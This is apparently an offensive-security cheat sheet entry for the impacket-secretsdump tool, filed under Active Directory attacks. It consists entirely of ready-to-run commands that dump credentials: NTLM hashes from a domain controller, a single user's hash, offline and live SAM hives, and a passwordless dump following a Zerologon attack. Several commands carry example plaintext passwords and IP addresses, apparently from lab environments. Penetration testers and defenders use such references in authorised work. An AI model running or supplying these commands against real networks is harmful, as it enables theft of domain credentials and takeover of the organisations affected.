---
title: impacket-secretsdump - Domain NTLM Dump
category: ad
subcategory: ad-attacks
os: linux
command: impacket-secretsdump -just-dc-ntlm domain/user@target
tools: impacket-secretsdump
---


### Just NTLM hashes from DC

```bash
impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/a-whitehat@10.10.176.223
```

### Single user

```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

### Local SAM offline

```bash
impacket-secretsdump -sam ./SAM -system ./SYSTEM LOCAL
```

### Local SAM live (with valid creds)

```bash
secretsdump.py thecyborg.lab/user1:'Password@123'@192.168.192.142
```

### After Zerologon (no password)

```bash
impacket-secretsdump -just-dc-ntlm -no-pass 'svcorp/SV-DC01$@10.11.1.20'
```
